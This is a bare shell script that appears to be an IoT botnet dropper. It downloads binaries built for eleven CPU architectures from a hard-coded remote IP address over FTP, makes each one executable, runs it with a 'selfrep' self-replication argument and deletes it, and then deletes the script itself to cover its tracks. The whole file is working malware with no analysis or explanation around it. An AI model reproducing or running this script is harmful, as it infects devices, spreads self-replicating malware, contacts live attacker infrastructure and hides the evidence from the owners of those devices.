#!/bin/sh
/bin/busybox ftpget 45.95.146.126 jklarm jklarm;/bin/busybox chmod +x jklarm;./jklarm selfrep;/bin/busybox rm -rf jklarm
/bin/busybox ftpget 45.95.146.126 jklarm5 jklarm5;/bin/busybox chmod +x jklarm5;./jklarm5 selfrep;/bin/busybox rm -rf jklarm5
/bin/busybox ftpget 45.95.146.126 jklarm6 jklarm6;/bin/busybox chmod +x jklarm6;./jklarm6 selfrep;/bin/busybox rm -rf jklarm6
/bin/busybox ftpget 45.95.146.126 jklarm7 jklarm7;/bin/busybox chmod +x jklarm7;./jklarm7 selfrep;/bin/busybox rm -rf jklarm7
/bin/busybox ftpget 45.95.146.126 jklm68k jklm68k;/bin/busybox chmod +x jklm68k;./jklm68k selfrep;/bin/busybox rm -rf jklm68k
/bin/busybox ftpget 45.95.146.126 jklmips jklmips;/bin/busybox chmod +x jklmips;./jklmips selfrep;/bin/busybox rm -rf jklmips
/bin/busybox ftpget 45.95.146.126 jklmpsl jklmpsl;/bin/busybox chmod +x jklmpsl;./jklmpsl selfrep;/bin/busybox rm -rf jklmpsl
/bin/busybox ftpget 45.95.146.126 jklppc jklppc;/bin/busybox chmod +x jklppc;./jklppc selfrep;/bin/busybox rm -rf jklppc
/bin/busybox ftpget 45.95.146.126 jklsh4 jklsh4;/bin/busybox chmod +x jklsh4;./jklsh4 selfrep;/bin/busybox rm -rf jklsh4
/bin/busybox ftpget 45.95.146.126 jklspc jklspc;/bin/busybox chmod +x jklspc;./jklspc selfrep;/bin/busybox rm -rf jklspc
/bin/busybox ftpget 45.95.146.126 jklx86 jklx86;/bin/busybox chmod +x jklx86;./jklx86 selfrep;/bin/busybox rm -rf jklx86
/bin/busybox rm -rf ftpget.sh
